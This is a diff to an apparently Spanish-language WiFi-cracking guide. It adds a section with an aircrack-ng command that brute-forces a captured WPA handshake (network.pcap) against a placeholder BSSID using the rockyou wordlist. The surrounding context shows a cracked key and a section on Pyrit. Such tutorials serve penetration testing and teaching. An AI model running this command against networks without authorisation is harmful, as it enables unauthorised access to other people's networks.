@@ -502,6 +502,13 @@ Testing:Hello123:18874049b807:d85d4cffcc5a:d85d4cffcc5a::WPA2:miCaptura.hccap
       EAPOL HMAC     : B5 CA CB CB A0 02 7F A8 3E A7 B1 DF 00 BF 28 43 
 ```
 
+## Fuerza bruta con archivo pcap y una dirección BSSID específica
+
+```bash
+┌─[root@kali]─[/Documents/WiFi/]
+└──╼ aircrack-ng -b AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt network.pcap
+```
+
 ## Cracking con Pyrit
 
 ```bash
